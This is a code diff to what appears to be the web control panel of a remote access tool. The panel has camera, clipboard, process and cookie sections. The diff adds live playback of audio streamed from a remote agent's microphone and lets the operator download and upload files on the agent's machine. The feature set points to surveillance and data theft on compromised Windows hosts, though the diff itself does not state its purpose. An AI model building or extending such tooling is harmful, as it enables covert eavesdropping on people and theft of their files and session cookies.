@@ -291,11 +291,11 @@ body { background: var(--bg); color: var(--text); display: flex; flex-direction:
   resize: vertical; min-height: 140px; outline: none;
 }
 #fm-textarea:focus { border-color: var(--accent); }
-#fm-save {
-  align-self: flex-end;
+#fm-save, #fm-download {
   background: var(--accent); border: none; color: #fff;
   border-radius: 8px; padding: 7px 16px; font-size: .82rem; cursor: pointer;
 }
+#fm-download { background: var(--surface2); border: 1px solid var(--border); color: var(--text); }
 
 /* ── Cookies ────────────────────────────────────────────── */
 #cookie-panel .panel-body { display: flex; flex-direction: column; gap: 12px; }
@@ -481,7 +481,10 @@ body { background: var(--bg); color: var(--text); display: flex; flex-direction:
 
     <!-- FILES -->
     <div class="panel" id="fm-panel">
-      <div class="panel-header"><h2>File Manager</h2></div>
+      <div class="panel-header"><h2>File Manager</h2>
+        <label id="fm-upload-btn" style="margin-left:auto;background:var(--accent);color:#fff;border-radius:7px;padding:6px 14px;font-size:.8rem;cursor:pointer;font-weight:600;">⬆ Upload</label>
+        <input id="fm-upload-input" type="file" style="display:none">
+      </div>
       <div id="fm-path-bar">
         <input id="fm-path" type="text" placeholder="Remote path…">
         <button id="fm-go">Go</button>
@@ -490,7 +493,10 @@ body { background: var(--bg); color: var(--text); display: flex; flex-direction:
       <div id="fm-editor">
         <div id="fm-editor-path"></div>
         <textarea id="fm-textarea"></textarea>
-        <button id="fm-save">Save File</button>
+        <div style="display:flex;gap:8px;justify-content:flex-end">
+          <button id="fm-download">⬇ Download</button>
+          <button id="fm-save">Save File</button>
+        </div>
       </div>
     </div>
 
@@ -722,8 +728,48 @@ document.getElementById("cam-toggle").addEventListener("click", function() {
   this.classList.toggle("on", camOn);
 });
 
-/* ── Microphone ──────────────────────────────────────────── */
+/* ── Microphone + Audio playback ─────────────────────────── */
 let micOn = false;
+let _audioCtx = null;
+let _nextPlayAt = 0;
+const SAMPLE_RATE = 16000;
+
+function _getAudioCtx() {
+  if (!_audioCtx || _audioCtx.state === "closed") {
+    _audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: SAMPLE_RATE });
+    _nextPlayAt = 0;
+  }
+  if (_audioCtx.state === "suspended") _audioCtx.resume();
+  return _audioCtx;
+}
+
+socket.on("audio", d => {
+  if (d._agent !== currentAgent || !micOn) return;
+  try {
+    const ctx = _getAudioCtx();
+    // Decode base64 → Int16 PCM → Float32
+    const raw = atob(d.data);
+    const int16 = new Int16Array(raw.length / 2);
+    for (let i = 0; i < int16.length; i++)
+      int16[i] = (raw.charCodeAt(i*2)) | (raw.charCodeAt(i*2+1) << 8);
+    const float32 = new Float32Array(int16.length);
+    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768;
+
+    const buf = ctx.createBuffer(1, float32.length, SAMPLE_RATE);
+    buf.copyToChannel(float32, 0);
+
+    const src = ctx.createBufferSource();
+    src.buffer = buf;
+    src.connect(ctx.destination);
+
+    // Schedule back-to-back without gaps; add 80ms jitter buffer on first chunk
+    const now = ctx.currentTime;
+    if (_nextPlayAt < now + 0.01) _nextPlayAt = now + 0.08;
+    src.start(_nextPlayAt);
+    _nextPlayAt += buf.duration;
+  } catch {}
+});
+
 document.getElementById("mic-toggle").addEventListener("click", function() {
   if (!currentAgent) return;
   micOn = !micOn;
@@ -732,6 +778,8 @@ document.getElementById("mic-toggle").addEventListener("click", function() {
   this.classList.toggle("on", micOn);
   document.getElementById("mic-vis").classList.toggle("active", micOn);
   document.getElementById("mic-label").textContent = micOn ? "Microphone is live…" : "Microphone is off";
+  if (micOn) _getAudioCtx(); // unlock audio context on user gesture
+  else if (_audioCtx) { _audioCtx.close(); _audioCtx = null; }
 });
 
 /* ── Clipboard ───────────────────────────────────────────── */
@@ -786,7 +834,7 @@ function renderProcs() {
 const fmPath   = document.getElementById("fm-path");
 const fmList   = document.getElementById("fm-list");
 const fmEditor = document.getElementById("fm-editor");
-let _editingPath = "";
+let _editingPath = "", _editingB64 = "";
 
 document.getElementById("fm-go").addEventListener("click", () => {
   if (!currentAgent) return;
@@ -809,10 +857,11 @@ socket.on("dir_result", d => {
   (d.items||[]).forEach(item => {
     const row = document.createElement("div");
     row.className = "fm-row";
-    row.innerHTML = `<div class="fm-icon">${item.type==="dir"?"📁":"📄"}</div><div class="fm-name">${esc(item.name)}</div><div class="fm-size">${item.type==="file"?fmtBytes(item.size||0):""}</div><button class="fm-del" data-path="${esc(item.path)}">🗑</button>`;
+    row.innerHTML = `<div class="fm-icon">${item.type==="dir"?"📁":"📄"}</div><div class="fm-name">${esc(item.name)}</div><div class="fm-size">${item.type==="file"?fmtBytes(item.size||0):""}</div><button class="fm-del">🗑</button>`;
     row.addEventListener("click", e => {
       if (e.target.classList.contains("fm-del")) return;
-      item.type==="dir" ? socket.emit("list_dir",{path:item.path,_target:currentAgent}) : socket.emit("read_file",{path:item.path,_target:currentAgent});
+      if (item.type==="dir") socket.emit("list_dir",{path:item.path,_target:currentAgent});
+      else socket.emit("read_file",{path:item.path,_target:currentAgent});
     });
     row.querySelector(".fm-del").addEventListener("click", e => {
       e.stopPropagation();
@@ -824,16 +873,57 @@ socket.on("dir_result", d => {
 });
 
 socket.on("file_data", d => {
+  if (d.error) { toast("Cannot read: "+d.error, "error"); return; }
   _editingPath = d.path||"";
+  _editingB64  = d.data||"";
   document.getElementById("fm-editor-path").textContent = _editingPath;
-  document.getElementById("fm-textarea").value = d.content||"";
+  // Try to show as text; fall back to hex message for binary
+  try {
+    const bytes = Uint8Array.from(atob(_editingB64), c=>c.charCodeAt(0));
+    document.getElementById("fm-textarea").value = new TextDecoder("utf-8",{fatal:true}).decode(bytes);
+  } catch {
+    document.getElementById("fm-textarea").value = "[binary file — use ⬇ Download to save it]";
+  }
   fmEditor.classList.add("show");
 });
+
 document.getElementById("fm-save").addEventListener("click", () => {
   if (!_editingPath || !currentAgent) return;
-  socket.emit("write_file",{path:_editingPath,data:document.getElementById("fm-textarea").value,_target:currentAgent});
+  const text = document.getElementById("fm-textarea").value;
+  const b64 = btoa(unescape(encodeURIComponent(text)));
+  socket.emit("write_file",{path:_editingPath,data:b64,_target:currentAgent});
 });
-socket.on("write_result", d => toast(d.ok?"File saved.":"Save failed: "+d.error, d.ok?"success":"error"));
+
+document.getElementById("fm-download").addEventListener("click", () => {
+  if (!_editingB64 || !_editingPath) return;
+  const bytes = Uint8Array.from(atob(_editingB64), c=>c.charCodeAt(0));
+  const blob = new Blob([bytes]);
+  const a = Object.assign(document.createElement("a"),{
+    href: URL.createObjectURL(blob),
+    download: _editingPath.split(/[\\/]/).pop()
+  });
+  a.click(); URL.revokeObjectURL(a.href);
+});
+
+// Upload a local file to the current remote directory
+document.getElementById("fm-upload-btn").addEventListener("click", () => {
+  document.getElementById("fm-upload-input").click();
+});
+document.getElementById("fm-upload-input").addEventListener("change", function() {
+  const file = this.files[0];
+  if (!file || !currentAgent) return;
+  const remotePath = (fmPath.value || "").replace(/[\\/]$/, "") + "\\" + file.name;
+  const fr = new FileReader();
+  fr.onload = e => {
+    const b64 = e.target.result.split(",")[1];
+    socket.emit("write_file",{path:remotePath,data:b64,_target:currentAgent});
+    toast("Uploading "+file.name+"…");
+  };
+  fr.readAsDataURL(file);
+  this.value = "";
+});
+
+socket.on("write_result", d => toast(d.ok?"Saved.":"Save failed: "+d.error, d.ok?"success":"error"));
 socket.on("delete_result", d => {
   toast(d.ok?"Deleted.":"Delete failed.", d.ok?"success":"error");
   if (d.ok) socket.emit("list_dir",{path:fmPath.value,_target:currentAgent});
